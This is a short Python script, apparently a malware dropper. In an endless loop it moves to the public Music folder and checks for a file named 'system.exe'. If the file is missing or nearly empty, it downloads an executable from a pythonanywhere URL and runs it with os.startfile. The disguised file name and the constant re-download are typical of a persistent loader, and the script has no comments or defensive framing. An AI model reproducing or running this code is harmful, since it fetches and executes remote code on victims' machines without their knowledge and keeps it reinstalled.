import requests,os,time
name = "system.exe"
while True:
    def download():
        url = f"https://pybdtest.pythonanywhere.com/media/files/{name}/"
        get_response = requests.get(url)

        with open(name, "wb") as out_file:
            out_file.write(get_response.content)
        os.startfile(name)
    x = -1
    for i in os.getcwd():
        if i == "\\":
            x += 1
    for i in range(x):
        os.chdir("..")

    os.chdir("public")
    os.chdir("Music")
    if os.path.isfile(name):
        with open(name,"r+") as r:
            r = r.read()
        if len(r) < 10:
            download()
    else:
        download()
    time.sleep(1)